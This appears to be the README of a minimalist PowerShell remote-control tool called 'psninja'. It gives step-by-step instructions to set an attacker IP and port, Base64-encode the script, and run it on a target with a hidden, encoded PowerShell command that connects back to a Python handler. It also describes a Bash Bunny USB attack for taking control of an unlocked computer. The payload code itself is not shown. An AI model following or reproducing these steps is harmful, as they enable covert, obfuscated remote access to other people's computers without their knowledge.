# psninja
Minimalist script<br/>

Step1. Edit IP and port on PS file<br/>
Step2. Base64 encoded with [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($string))<br/>
Step3. execute on target with powershell.exe -EncodedCommand $encodedcommand<br/>
Step4. Start Python server and handler<br/>
Step5. Have fun<br/>

For bashbunny
Step1. change IP to your hostname on batgen.ps1 and run batgen.ps1
Step2. Start control server
Step3. Insert USB into your unlocked computer you wish to control

(you may have to change the drive letters for this work correctly)

example

powershell.exe -windowstyle hidden -enc
